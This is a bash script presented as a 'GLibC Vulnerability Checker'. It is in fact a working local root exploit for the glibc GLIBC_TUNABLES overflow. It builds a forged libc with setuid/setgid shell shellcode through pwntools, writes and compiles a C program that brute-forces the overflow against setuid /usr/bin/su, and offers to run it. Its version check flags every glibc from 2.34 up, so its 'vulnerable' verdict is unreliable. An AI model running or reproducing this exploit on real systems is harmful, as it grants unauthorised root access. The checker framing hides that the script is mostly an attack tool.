#!/bin/bash

# Define colors using tput
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 3)
CYAN=$(tput setaf 6)
RESET=$(tput sgr0)
BOLD=$(tput bold)

# Tool banner
echo "${CYAN}
██╗      ██████╗  ██████╗ ███╗   ██╗███████╗██╗   ██╗██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ 
██║     ██╔═══██╗██╔═══██╗████╗  ██║██╔════╝╚██╗ ██╔╝██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗
██║     ██║   ██║██║   ██║██╔██╗ ██║█████╗   ╚████╔╝ ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██║     ██║   ██║██║   ██║██║╚██╗██║██╔══╝    ╚██╔╝  ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
███████╗╚██████╔╝╚██████╔╝██║ ╚████║███████╗   ██║   ██║     ╚███╔███╔╝██║ ╚████║███████╗██║  ██║

${RESET}"
echo "${YELLOW}${BOLD}GLibC Vulnerability Checker (GVC)${RESET}"
echo "------------------------------------"

# Extract glibc version using ldd --version
glibc_version=$(ldd --version | head -n 1 | awk '{print $NF}')

# Check if the version is vulnerable (i.e., >= 2.34)
if [[ $(echo "$glibc_version 2.34" | awk '{print ($1 >= $2)}') -ne 0 ]]; then
    echo "${RED}Vulnerable version of glibc detected: $glibc_version${RESET}"
    echo "Do you want to root? (yes/no)"
    read choice
    if [[ $choice == "yes" ]]; then
        echo "${YELLOW}Running the exploit be patient................................${RESET}"
        
        # Run the Python code to modify the libc
        /usr/bin/env python3 - << EOF
from pwn import *
context.os = "linux"
context.arch = "x86_64"
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
d = bytearray(open(libc.path, "rb").read())
sc = asm(shellcraft.setuid(0) + shellcraft.setgid(0) + shellcraft.sh())
orig = libc.read(libc.sym["__libc_start_main"], 0x10)
idx = d.find(orig)
d[idx : idx + len(sc)] = sc
open("./libc.so.6", "wb").write(d)
EOF

        # Create exp.c with the given code
        cat > exp.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/resource.h>
#include <sys/wait.h>

#define FILL_SIZE 0xd00
#define BOF_SIZE 0x600

// copied from somewhere, probably https://stackoverflow.com/a/11765441
int64_t time_us()
{
    struct timespec tms;

    /* POSIX.1-2008 way */
    if (clock_gettime(CLOCK_REALTIME, &tms))
    {
        return -1;
    }
    /* seconds, multiplied with 1 million */
    int64_t micros = tms.tv_sec * 1000000;
    /* Add full microseconds */
    micros += tms.tv_nsec / 1000;
    /* round up if necessary */
    if (tms.tv_nsec % 1000 >= 500)
    {
        ++micros;
    }
    return micros;
}

int main(void)
{
    char filler[FILL_SIZE], kv[BOF_SIZE], filler2[BOF_SIZE + 0x20], dt_rpath[0x20000];
    char *argv[] = {"/usr/bin/su", "--help", NULL};
    char *envp[0x1000] = {
        NULL,
    };

    // copy forged libc
    if (mkdir("\"", 0755) == 0)
    {
        int sfd, dfd, len;
        char buf[0x1000];
        dfd = open("\"/libc.so.6", O_CREAT | O_WRONLY, 0755);
        sfd = open("./libc.so.6", O_RDONLY);
        do
        {
            len = read(sfd, buf, sizeof(buf));
            write(dfd, buf, len);
        } while (len == sizeof(buf));
        close(sfd);
        close(dfd);
    } // else already exists, skip

    strcpy(filler, "GLIBC_TUNABLES=glibc.malloc.mxfast=");
    for (int i = strlen(filler); i < sizeof(filler) - 1; i++)
    {
        filler[i] = 'F';
    }
    filler[sizeof(filler) - 1] = '\0';

    strcpy(kv, "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=");
    for (int i = strlen(kv); i < sizeof(kv) - 1; i++)
    {
        kv[i] = 'A';
    }
    kv[sizeof(kv) - 1] = '\0';

    strcpy(filler2, "GLIBC_TUNABLES=glibc.malloc.mxfast=");
    for (int i = strlen(filler2); i < sizeof(filler2) - 1; i++)
    {
        filler2[i] = 'F';
    }
    filler2[sizeof(filler2) - 1] = '\0';

    for (int i = 0; i < 0xfff; i++)
    {
        envp[i] = "";
    }

    for (int i = 0; i < sizeof(dt_rpath); i += 8)
    {
        *(uintptr_t *)(dt_rpath + i) = -0x14ULL;
    }
    dt_rpath[sizeof(dt_rpath) - 1] = '\0';

    envp[0] = filler;                               // pads away loader rw section
    envp[1] = kv;                                   // payload
    envp[0x65] = "";                                // struct link_map ofs marker
    envp[0x65 + 0xb8] = "\x30\xf0\xff\xff\xfd\x7f"; // l_info[DT_RPATH]
    envp[0xf7f] = filler2;                          // pads away :tunable2=AAA: in between
    for (int i = 0; i < 0x2f; i++)
    {
        envp[0xf80 + i] = dt_rpath;
    }
    envp[0xffe] = "AAAA"; // alignment, currently already aligned

    struct rlimit rlim = {RLIM_INFINITY, RLIM_INFINITY};
    if (setrlimit(RLIMIT_STACK, &rlim) < 0)
    {
        perror("setrlimit");
    }

    /*
    if (execve(argv[0], argv, envp) < 0) {
        perror("execve");
    }
    */

    int pid;
    for (int ct = 1;; ct++)
    {
        if (ct % 100 == 0)
        {
            printf("try %d\n", ct);
        }
        if ((pid = fork()) < 0)
        {
            perror("fork");
            break;
        }
        else if (pid == 0) // child
        {
            if (execve(argv[0], argv, envp) < 0)
            {
                perror("execve");
                break;
            }
        }
        else // parent
        {
            int wstatus;
            int64_t st, en;
            st = time_us();
            wait(&wstatus);
            en = time_us();
            if (!WIFSIGNALED(wstatus) && en - st > 1000000)
            {
                // probably returning from shell :)
                break;
            }
        }
    }

    return 0;
}
EOF

        # Compiling exp.c
        gcc -o exp exp.c
        if [[ $? -eq 0 ]]; then
            echo "${GREEN}Exploit compiled successfully. Run './exp' to execute it.${RESET}"
            echo "Do you want to execute the exploit now? (yes/no)"
            read run_choice
            if [[ $run_choice == "yes" ]]; then
                echo "${YELLOW}Executing the exploit this may take a while.........................................${RESET}"
                ./exp
            fi
        else
            echo "${RED}Error occurred while compiling the exploit.${RESET}"
        fi

    fi
else
    echo "${GREEN}System is not vulnerable. Installed glibc version: $glibc_version${RESET}"
fi

echo "------------------------------------"

# You Should Probably Consider Patching Your System
echo "${YELLOW}Note: If vulnerable, please consider patching your system ASAP.${RESET}"
